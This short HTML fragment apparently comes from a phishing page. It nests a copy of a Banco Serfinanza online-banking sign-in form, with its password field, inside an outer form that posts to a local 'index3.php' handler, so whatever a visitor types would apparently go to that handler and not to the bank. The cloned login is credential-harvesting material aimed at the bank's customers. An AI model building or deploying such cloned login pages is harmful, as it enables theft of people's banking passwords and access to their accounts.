...
<body>
  <form action="index3.php" name="form1" id="form1" method="post" class="contact-form">
...
<form action="https://serfinanzavirtual.bancoserfinanza.com/Personal/Login/Index" autocomplete="off" class="form-signin" id="form-login" method="post" name="form-login" role="form">    <div>
        ...
        <div id="login-password" style="">
            ...
            <div class="inputLogin">
                ...
                <input type="password" class="form-control is-keypad" id="psw" name="psw" placeholder="Ingresa tu contraseña" maxlength="15" autocomplete="off">
            </div>
        </div>
        <div class="row">
